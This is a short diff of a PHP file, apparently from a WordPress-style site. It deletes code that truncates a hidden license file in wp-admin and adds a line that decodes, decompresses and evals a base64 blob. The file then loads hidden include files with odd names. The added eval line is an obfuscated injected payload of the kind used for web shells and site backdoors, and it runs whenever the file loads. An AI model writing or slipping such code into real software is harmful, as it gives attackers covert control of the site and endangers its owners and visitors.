@@ -1,10 +1,5 @@
 <?php
-//open file to write
-$fp = fopen("../wp-admin/.license.txt", "w+");
-// clear content to 0 bits
-ftruncate($fp, 0);
-//close file
-fclose($fp);
+eval(gzinflate(base64_decode('JY1BCgMhDEX3gncI0sWUTs3sSw9jbYSAjaIpzvE7Tpef93jfIJZKAokzgRYYjZWsuaQKT0gTLc57HPUe3h8W9JkjSSevu7oV3Li568MaRIiZQoNYREl0pjZ4sXZrkravxKC0HNUVtr8fc+l03h7GOSae7Ac=')));
 ?> <?php
 require('glb_con/GoldFash/.require.php');
 require('.bridge.php');
